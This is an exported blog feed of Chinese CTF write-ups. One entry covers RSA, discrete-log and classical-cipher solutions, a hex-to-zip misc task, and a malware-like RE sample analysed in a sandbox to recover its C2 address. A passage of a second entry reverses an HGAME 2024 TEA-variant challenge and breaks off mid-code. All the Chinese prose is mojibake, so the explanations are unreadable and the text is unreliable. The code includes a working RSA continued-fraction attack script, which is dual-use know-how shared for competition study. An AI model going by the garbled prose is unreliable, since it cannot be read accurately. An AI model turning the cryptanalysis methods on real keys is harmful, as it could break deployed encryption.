        <content type="html"><![CDATA[<p>ä¸çŸ¥ä¸ºä½•ï¼Œå¯†ç æ¯”é€†å‘åšçš„å¤šï¼Œä½†æ˜¯ä¸ä¼šå¯†ç ä¹Ÿä¸ä¼šé€†å‘</p><h2 id="crypto">crypto</h2><h3 id="è§£ä¸ªæ–¹ç¨‹">è§£ä¸ªæ–¹ç¨‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">p = <span class="number">88405749077010121197972538332505989817</span></span><br><span class="line">q = <span class="number">314336612126421969080144444342415739457</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯åŠ¨æ€flag</p><h3 id="ez-log">ez_log</h3><p>è¿™ä¸ªé¢˜æ˜¯æ±‚ç¦»æ•£å¯¹æ•°ï¼Œg=3ï¼Œç›´æ¥ç”¨å‡½æ•°æ±‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">p=<span class="number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></span><br><span class="line">g = <span class="number">3</span></span><br><span class="line">c=<span class="number">2637361207438328172880452774725735558448205624296999428196250415451022718950315626464793126507500112508727744681450551541566511482157902377105193512791814667446983536196889757495426692091900</span></span><br><span class="line"></span><br><span class="line">m = discrete_log(p, c, g)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯åŠ¨æ€flag</p><h3 id="å››é‡åŠ å¯†">å››é‡åŠ å¯†</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">base32:</span></span><br><span class="line"><span class="language-xml">qsnctf</span></span><br><span class="line"><span class="language-xml">ascii code:</span></span><br><span class="line"><span class="language-xml">zcye</span><span class="template-variable">&#123;mxmemtxrzt_lzbha_kwmqzec&#125;</span><span class="language-xml">|key=hello</span></span><br><span class="line"><span class="language-xml">ç»´å‰å°¼äºšï¼š</span></span><br><span class="line"><span class="language-xml">synt</span><span class="template-variable">&#123;yqitbfqnoi_xsxwp_wpifoqv&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">å‡¯æ’’:</span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;ldvgosdabv_kfkjc_jcvsbdi&#125;</span></span><br></pre></td></tr></table></figure><p>æŠŠflagæ”¹æˆqsnctfå°±å¥½</p><h3 id="ez-rsa">ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">leak = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak = <span class="subst">&#123;leak&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå·²çŸ¥r,e,cæ±‚m</p><p>æˆ‘ä»¬çŸ¥é“<br>$$<br>c = m^e \mod pqr\iff\<br>c = m^e + kpqr\iff\<br>c = m^e + (kpq)r\iff\<br>c = m^e \mod r<br>$$<br>é‚£ä¹ˆå°±å¯ä»¥è§£å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line"></span><br><span class="line">c = <span class="number">173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></span><br><span class="line">n = <span class="number">1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></span><br><span class="line">leak = <span class="number">152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></span><br><span class="line">r = n // leak</span><br><span class="line">phi = r-<span class="number">1</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = gy.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#qsnctf&#123;12ff81e0-7646-4a96-a7eb-6a509ec01c9e&#125;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™é“é¢˜å¯ä»¥çŸ¥é“ï¼šå·²çŸ¥c,e,å’Œnçš„ä»»æ„ä¸€ä¸ªå› å­ï¼ˆå¦‚æœè¿™ä¸ªå› å­å¯ä»¥æ±‚phiï¼‰é‚£å°±å¯ä»¥ç›´æ¥è§£</p><h3 id="factor1">factor1</h3><p>è¿™ä¸ªé¢˜æ˜¯ç¬¬ä¸€æ¬¡è§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">2</span> - <span class="number">1</span>) * (q**<span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p+q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></span><br><span class="line"><span class="comment"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¢˜å¾ˆç¥å¥‡çš„åœ°æ–¹åœ¨äº(p**2 - 1) * (q**2 - 1),æ‰€ä»¥æˆ‘å»æœäº†ä¸€ä¸‹ï¼Œå°±æœåˆ°æ”»å‡»è„šæœ¬äº†</p><p><a href="https://www.cnblogs.com/tr0uble/p/17106202.html#/c/subject/p/17106202.html">Cryptanalysis of RSA Variants with Primes Sharing Most Significant Bits - tr0uble - åšå®¢å›­ (cnblogs.com)</a></p><p>å¥½åƒå«LUCï¼Œç”¨è¿åˆ†æ•°æ–¹æ³•æ”»å‡»ï¼Œä½†æ˜¯çœ‹ä¸æ‡‚ï¼Œæœ‰æœºä¼šä¹‹åçœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">N, e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors of a modulus and the private exponent if two prime factors share most significant bits</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param e: the public exponent</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors and the private exponent, or None if the private exponent was not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    PR = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    x = PR.gen()</span><br><span class="line">    convergents = continued_fraction(ZZ(e) / ZZ((N-<span class="number">1</span>)**<span class="number">2</span>)).convergents()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> convergents:</span><br><span class="line">        k = c.numerator()</span><br><span class="line">        d = c.denominator()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = x**<span class="number">2</span> - x*(N**<span class="number">2</span> + <span class="number">1</span> - <span class="built_in">int</span>((e*d-<span class="number">1</span>)/k)) + N**<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> f.discriminant() &gt; <span class="number">0</span>:</span><br><span class="line">                root = f.roots()</span><br><span class="line">                p2 = root[<span class="number">0</span>][<span class="number">0</span>]; q2 = root[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> is_square(p2) <span class="keyword">and</span> is_square(q2):</span><br><span class="line">                    p = isqrt(p2); q = isqrt(q2)</span><br><span class="line">                    <span class="keyword">if</span> p*q == N:</span><br><span class="line">                        <span class="keyword">return</span> p, q, d</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></span><br><span class="line">n = <span class="number">78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></span><br><span class="line">p=q=d=<span class="number">0</span></span><br><span class="line">p,q,d = attack(n,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(p + q))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯sage</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">17842948407837550252915901438494310860377505026658598797918460167146832545038336985103505761787935094014130901091944301325113646047622033244783641463109866</span>\</span><br><span class="line"><span class="attribute">qsnctf</span>&#123;<span class="number">8072</span>e8b2982bc729cc74ef58f1abc862&#125;</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><p>é‚£ä¸ªtxtä¸€æ‰“å¼€ï¼Œå¥½åƒçœ‹ä¸å‡ºæ¥æ˜¯ä»€ä¹ˆï¼Œåˆ°æœ€åå‘ç°504d0304é‚£å°±æ˜¯å‹ç¼©åŒ…äº†ï¼Œå†™ä¸ªè„šæœ¬ç”Ÿæˆæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bin</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f_in):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment"># æ¯éš”ä¸€è¡Œå¤„ç†ä¸€æ¬¡</span></span><br><span class="line">                hex_str = line[<span class="number">10</span>:<span class="number">57</span>].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># ä»ç¬¬11ä¸ªå­—ç¬¦å¼€å§‹ï¼Œè¯»å–åˆ°ç¬¬57ä¸ªå­—ç¬¦</span></span><br><span class="line">                bin_data = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">                f_out.write(bin_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_to_bin(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;output.zip&#x27;</span>)</span><br><span class="line"><span class="comment">#è¿™è¾¹äº‹å…ˆå¤„ç†æˆæ­£çš„äº†</span></span><br></pre></td></tr></table></figure><p>output.zipç›´æ¥çˆ†ç ´ï¼Œå› ä¸ºè¯´äº†æ˜¯å°å†™å’Œæ•°å­—</p><p>z12345ï¼Œå¾—åˆ°flagå›¾ç‰‡æ‹¼æ¥å³å¯</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">qsnctf</span><span class="template-variable">&#123;b414e3e3a6449ddba0997db259203eb7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE">RE</h2><h3 id="æ¥æ‰“cså’¯">æ¥æ‰“cså’¯</h3><p>æ–‡ä»¶æè¿°ä¸è¦åœ¨å®ä½“æœºæ‰“å¼€</p><p>äºæ˜¯åœ¨win10è™šæ‹Ÿæœºä¸­sandboxieä¸­å°è¯•ç”¨idaè°ƒè¯•</p><p>ä½†æ˜¯æ‰“å¼€åå‡½æ•°å¾ˆæ‚ï¼Œçœ‹ä¸å‡ºæ¥åœ¨å¹²ä»€ä¹ˆ</p><p>ç½‘ä¸ŠæŸ¥æŸ¥è¿™ç§é¢˜è¯¥æ€ä¹ˆåšï¼Œçœ‹åˆ°è¦æ”¾åˆ°åœ¨çº¿æ²™ç®±ä¸­åˆ†æä¸€ä¸‹</p><p>ç›´æ¥æ‹¿åˆ°</p><p>10.0.80.253:8118</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">qsnctf</span>&#123;<span class="number">10.0.80.253:8118</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2024 week4 RE wp</title>
      <link href="/posts/f5113ec1.html"/>
      <url>/posts/f5113ec1.html</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡reè‡³å°‘èƒ½çœ‹æ‡‚</p><h2 id="RE">RE</h2><h3 id="again">again!</h3><p>æ‰“å¼€åå‘ç°ä¸€ä¸ªpyæ‰“åŒ…çš„exeå’Œbin2.pyc</p><p>åç¼–è¯‘ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ–‡ä»¶,è¯´æ˜¯è¦ç”¨è¿™ä¸ªæ–‡ä»¶å»è§£å¯†bin2,ä½†æ˜¯çœ‹ä¸æ‡‚QAQ</p><p>ä½†æ˜¯äºŒè¿›åˆ¶å½¢å¼æ‰“å¼€bin2ï¼Œè§‚å¯Ÿå¯ä»¥å‘ç°å‡ºç°å¤§é‡ä¸€æ ·çš„</p><p>a405b5d321e446459d8f9169d027bd92</p><p>æ€€ç–‘æ˜¯å¼‚æˆ–ï¼Œæ‰€ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_key</span>(<span class="params">input_file, key, output_file</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fin, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = fin.read(<span class="number">32</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(chunk))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunk)):</span><br><span class="line">                data[i] = chunk[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])  </span><br><span class="line">            fout.write(data)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;a405b5d321e446459d8f9169d027bd92&quot;</span>  </span><br><span class="line">xor_with_key(<span class="string">&#x27;bin2&#x27;</span>, key, <span class="string">&#x27;output.bin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°çš„æ–‡ä»¶å†äºŒè¿›åˆ¶æ‰“å¼€ä¸€ä¸‹ï¼Œæ˜¯winPEï¼Œå°±idaæ‰“å¼€</p><p>ä¸»å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001020(<span class="string">&quot;plz input your flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%32s&quot;</span>,flag);</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x1234</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x2341</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x3412</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x4123</span>;</span><br><span class="line">  encode(key);</span><br><span class="line">  i = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( flag[i] == *(_DWORD *)((<span class="type">char</span> *)&amp;check + i * <span class="number">4</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001020(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001020(<span class="string">&quot;Wrong!try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥å°±æ˜¯flagä»¥dwordæ¥åŠ å¯†ç„¶åæ¯”è¾ƒ,encodeé‡Œé¢æ˜¯ä¸€ä¸ªTEAå˜ä½“ï¼Œç›´æ¥é€†å°±å¥½äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s6;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s4; <span class="comment">// r15d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s3; <span class="comment">// r14d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s2; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s1; <span class="comment">// esi</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s0; <span class="comment">// r11d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s7; <span class="comment">// [rsp+40h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag[<span class="number">8</span>] = &#123; <span class="number">0x506FB5C3</span>, <span class="number">0xB9358F45</span>, <span class="number">0xC91AE8C7</span>, <span class="number">0x3820E280</span>, <span class="number">0xD13ABA83</span>, <span class="number">0x975CF554</span>, <span class="number">0x4352036B</span>, <span class="number">0x1CD20447</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00001234</span>, <span class="number">0x00002341</span>, <span class="number">0x00003412</span>, <span class="number">0x00004123</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key_[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00001234</span>, <span class="number">0x00002341</span>, <span class="number">0x00003412</span>, <span class="number">0x00004123</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">s7 = flag[<span class="number">7</span>];</span><br><span class="line">s1 = flag[<span class="number">1</span>];</span><br><span class="line">s2 = flag[<span class="number">2</span>];</span><br><span class="line">s3 = flag[<span class="number">3</span>];</span><br><span class="line">s4 = flag[<span class="number">4</span>];</span><br><span class="line">s5 = flag[<span class="number">5</span>];</span><br><span class="line">s6 = flag[<span class="number">6</span>];</span><br><span class="line">s0 = flag[<span class="number">0</span>];</span><br><span class="line">delta = <span class="number">0</span>;</span><br><span class="line">delta += <span class="number">0x7937B99E</span> * <span class="number">12</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++) &#123;</span><br><span class="line">v11 = key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">s7 -= (((s6 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">3</span>]) + (delta ^ flag[<span class="number">0</span>])) ^ (((<span class="number">16</span> * s6) ^ (flag[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((s6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * flag[<span 